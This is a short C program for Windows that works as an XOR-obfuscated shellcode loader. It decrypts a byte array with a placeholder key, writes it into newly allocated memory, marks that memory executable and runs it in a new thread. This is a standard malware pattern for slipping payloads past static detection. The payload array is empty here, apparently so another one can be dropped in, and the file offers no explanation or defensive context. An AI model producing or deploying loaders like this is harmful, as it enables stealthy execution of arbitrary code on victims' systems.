#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	unsigned char calc_payload[] = "";
	unsigned int calc_len = sizeof(calc_payload);
	char key[] = "secret here";

	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	XOR((char *) calc_payload, calc_len, key, sizeof(key));
	
	RtlMoveMemory(exec_mem, calc_payload, calc_len);
	
	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
